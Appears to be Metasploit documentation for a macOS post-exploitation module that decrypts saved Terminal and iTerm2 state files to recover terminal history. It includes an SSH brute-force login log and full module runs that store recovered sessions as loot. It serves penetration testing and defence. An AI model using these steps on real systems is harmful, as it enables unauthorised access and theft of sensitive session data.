## Vulnerable Application

This module enumerates the saved state files for the Terminal and iTerm2
applications on macOS 10.7-14, and Terminal's daemon-container saved state on macOS 15 and later.
These files are encrypted with AES-128-CBC, but
the key is stored in plaintext in the accompanying windows.plist file.
The decrypted files contain a copy of what was sent to and from the
terminal, which may include sensitive information.

Tested against macOS 11.7.11.

On macOS 15+, Terminal's saved state is also discovered under
`~/Library/Daemon Containers/<container UUID>/Data/Library/Saved Application State/`.
The module reads XML or binary `ApplicationMapping.plist` files to locate Terminal's mapped
saved-state directory. XML is parsed with Ruby's REXML library; no additional gem is required.
The same format detection applies to `windows.plist`; decrypted window archives use the binary parser.
Malformed or unrecognized mapping files produce a verbose warning and are skipped so discovery can continue.
The process providing the session must have Full Disk Access to read this container path.
The legacy Terminal and iTerm2 saved-state paths are still checked first.

Recovered tab text trims trailing ASCII spaces from each stored row and adds one LF per row,
including the final row, to match the reference extractor's rendering. Embedded LFs, internal
blank lines, tabs, and other whitespace are preserved.

## Verification Steps

1. on MacOS open a terminal and type some stuff. Then type `exit`
2. Start msfconsole
3. Get a shell on a vulnerable MacOS
4. Do: `use post/osx/gather/terminal_save_state`
5. Do: `set session [#]`
6. Do: `run`
7. You should get decrypted terminal sessions

### Synthetic regression test

Run the accompanying standalone test with Ruby and macOS `plutil` from the repository root:

```sh
ruby terminal_save_state_test.rb --seed 21446
```

The test generates synthetic XML and binary plists and AES-128-CBC records and stubs the framework's session,
file access, logging, and loot storage. It exercises the module's container mapping, legacy paths,
UID resolution, tab rows, UTF-8 replacement, working directories, and newest-record selection.
XML mapping tests cover shell and Meterpreter discovery, malformed inputs, and continued discovery
after an invalid mapping. Row-rendering tests cover ASCII-space trimming, an LF per row, embedded LFs,
blank rows, and preservation of other whitespace. Generated fixtures use temporary directories.
Two complete records for one window, with an oversized embedded plist length in the newer `_NSWindow`
record, must produce a warning and skip that window without exporting its older snapshot.
A torn final record instead warns and stops while retaining the preceding complete state.
The test should report zero failures and zero errors; it does not verify live macOS 15+ artifacts,
Full Disk Access permissions, or execution inside Metasploit.

### Real saved-state fixture validation

Offline validation against a copied macOS 26.4.1 Terminal fixture resolved the real XML mapping
in both shell and Meterpreter stubs. Recovered tab text matched the reference extractor for
326/326 real windows by normalized SHA256 and byte length, with per-tab agreement required.
This validates discovery and parsing through filesystem stubs, not a live Metasploit session,
Full Disk Access behavior, iTerm2, other macOS versions, or bitmap recovery.

## Options

### USER

User to target, or ALL for all users. Defaults to `ALL`

## Scenarios

### macOS 11.7.11

Original shell

```
msf > use auxiliary/scanner/ssh/ssh_login
[*] Using configured payload windows/meterpreter/reverse_tcp
msf auxiliary(scanner/ssh/ssh_login) > set rhosts 1.1.1.1
rhosts => 1.1.1.1
msf auxiliary(scanner/ssh/ssh_login) > set username h00die
username => h00die
msf auxiliary(scanner/ssh/ssh_login) > set password "example_password"
password =>  example_password
msf auxiliary(scanner/ssh/ssh_login) > exploit
[*] 1.1.1.1:22       - Starting bruteforce
[*] 1.1.1.1:22 SSH - Testing User/Pass combinations
[+] 1.1.1.1:22       - Success: 'h00die: example_password ' 'uid=501(h00die) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),101(com.apple.access_ssh-disabled),701(com.apple.sharepoint.group.1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),102(com.apple.access_screensharing-disabled),400(com.apple.access_remote_ae) Darwin h00dies-MacBook-Pro.local 20.6.0 Darwin Kernel Version 20.6.0: Thu Jul  6 22:12:47 PDT 2023; root:xnu-7195.141.49.702.12~1/RELEASE_X86_64 x86_64 '
[*] SSH session 1 opened (2.2.2.2:35983 -> 1.1.1.1:22) at 2026-05-12 05:30:10 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/ssh/ssh_login) > sessions -i 1
[*] Starting interaction with 1...

sw_vers
ProductName:    macOS
ProductVersion: 11.7.11
BuildVersion:   20G1443
^Z
Background session 1? [y/N]  y
```

Module run

```
msf auxiliary(scanner/ssh/ssh_login) > use post/osx/gather/terminal_save_state
msf post(osx/gather/terminal_save_state) > set session 1
session => 1
msf post(osx/gather/terminal_save_state) > rexploit
[*] Reloading module...
[*] Not found: /Users/Shared/Library/Saved Application State/com.apple.Terminal.savedState
[*] Not found: /Users/Shared/Library/Saved Application State/com.googlecode.iterm2.savedState
[*] Processing: /Users/h00die/Library/Saved Application State/com.apple.Terminal.savedState
[*]   Window: (no title)
[*]   Stored window state JSON to: /root/.msf4/loot/20260512053302_default_1.1.1.1_osx.terminal.win_274926.json
[!]   No metadata for window ID 5, skipping
[*]   Window: (no title)
[*]   Stored window state JSON to: /root/.msf4/loot/20260512053302_default_1.1.1.1_osx.terminal.win_874806.json
[*]   Window: (no title)
[*]   Stored window state JSON to: /root/.msf4/loot/20260512053302_default_1.1.1.1_osx.terminal.win_935009.json
[!]   No metadata for window ID 5, skipping
[!]   No metadata for window ID 17, skipping
[*]   Window: h00die — 80×24
[*]   Stored window state JSON to: /root/.msf4/loot/20260512053302_default_1.1.1.1_osx.terminal.win_970663.json
[+]   Recovered terminal history for window: h00die — 80×24
[*] h00die@h00dies-MacBook-Pro ~ % whoami
h00die
h00die@h00dies-MacBook-Pro ~ % nano .example
h00die@h00dies-MacBook-Pro ~ % cat .example
test
h00die@h00dies-MacBook-Pro ~ % exit
Saving session...
...copying shared history...
...saving history...truncating history files...
...completed.

[Process completed]

[+]   Stored to: /root/.msf4/loot/20260512053302_default_1.1.1.1_osx.terminal.his_625716.txt
[*] Not found: /Users/h00die/Library/Saved Application State/com.googlecode.iterm2.savedState
[*] Post module execution completed
msf post(osx/gather/terminal_save_state) > rexploit
[*] Reloading module...
[*] Not found: /Users/Shared/Library/Saved Application State/com.apple.Terminal.savedState
[*] Not found: /Users/Shared/Library/Saved Application State/com.googlecode.iterm2.savedState
[*] Processing: /Users/h00die/Library/Saved Application State/com.apple.Terminal.savedState
[*]   Window: (no title)
[*]   Stored window state JSON to: /root/.msf4/loot/20260512053349_default_1.1.1.1_osx.terminal.win_293819.json
[!]   No metadata for window ID 5, skipping
[*]   Window: (no title)
[*]   Stored window state JSON to: /root/.msf4/loot/20260512053349_default_1.1.1.1_osx.terminal.win_601053.json
[*]   Window: (no title)
[*]   Stored window state JSON to: /root/.msf4/loot/20260512053349_default_1.1.1.1_osx.terminal.win_967075.json
[!]   No metadata for window ID 5, skipping
[!]   No metadata for window ID 17, skipping
[*]   Window: h00die — 80×24
[*]   Stored window state JSON to: /root/.msf4/loot/20260512053349_default_1.1.1.1_osx.terminal.win_206721.json
[+]   Recovered terminal history for window: h00die — 80×24
[*] h00die@h00dies-MacBook-Pro ~ % whoami
h00die
h00die@h00dies-MacBook-Pro ~ % nano .example
h00die@h00dies-MacBook-Pro ~ % cat .example
test
h00die@h00dies-MacBook-Pro ~ % exit
Saving session...
...copying shared history...
...saving history...truncating history files...
...completed.

[Process completed]

[+]   Stored to: /root/.msf4/loot/20260512053349_default_1.1.1.1_osx.terminal.his_746504.txt
[*] Not found: /Users/h00die/Library/Saved Application State/com.googlecode.iterm2.savedState
[*] Post module execution completed
```
